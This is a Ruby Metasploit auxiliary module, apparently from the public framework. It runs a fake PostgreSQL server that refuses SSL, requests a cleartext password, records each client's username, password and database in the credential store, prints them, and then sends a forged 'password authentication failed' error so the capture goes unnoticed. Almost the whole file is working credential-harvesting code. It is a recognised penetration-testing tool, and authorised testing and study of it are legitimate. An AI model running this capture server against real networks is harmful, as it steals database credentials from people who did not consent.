##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: PostgreSQL',
      'Description' => %q{
        This module provides a fake PostgreSQL service that is designed to
        capture clear-text authentication credentials.},
      'Author' => 'Dhiru Kholia <dhiru[at]openwall.com>',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run PostgreSQL capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5432 ]),
      ]
    )
  end

  # This module is based on MySQL capture module by Patrik Karlsson.
  # Reference: http://www.postgresql.org/docs/9.2/static/protocol-message-formats.html

  def setup
    super
    @state = {}
  end

  def run
    exploit
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport
    }
    @state[client]['status'] = :init
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    length = data.slice(0, 4).unpack('N')[0]
    if (length == 8) && (@state[client]['status'] == :init)
      # SSL request
      client.put 'N'
      @state[client]['status'] = :send_auth_type
    elsif @state[client]['status'] == :send_auth_type
      # Startup message
      data.slice!(0, 4).unpack('N')[0] # skip over length
      data.slice!(0, 4).unpack('N')[0] # skip over protocol
      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack('C*')
      client.put sdata
      data.slice!(0, 5) # skip over "user\x00"
      @state[client][:username] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
      data.slice!(0, 9) # skip over "database\x00"
      @state[client][:database] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
      @state[client]['status'] = :pwn
    elsif (@state[client]['status'] == :pwn) && (data[0] == 'p')
      # Password message
      data.slice!(0, 5).unpack('N')[0] # skip over length
      @state[client][:password] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
      report_cred(
        ip: client.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'psql_client',
        user: @state[client][:username],
        password: @state[client][:password],
        proof: @state[client][:database]
      )
      print_good("PostgreSQL LOGIN #{@state[client][:name]} #{@state[client][:username]} / #{@state[client][:password]} / #{@state[client][:database]}")
      # send failure message
      sdata = [ 0x45, 97 - 8 + @state[client][:username].length].pack('CN')
      sdata << 'SFATAL'
      sdata << "\x00"
      sdata << 'C28P01'
      sdata << "\x00"
      sdata << "Mpassword authentication failed for user \"#{@state[client][:username]}\""
      sdata << "\x00"
      sdata << 'Fauth.c'
      sdata << "\x00"
      sdata << 'L302'
      sdata << "\x00"
      sdata << 'Rauth_failed'
      sdata << "\x00\x00"
      client.put sdata
      client.close
    end
  end

  def on_client_close(client)
    @state.delete(client)
  end
end
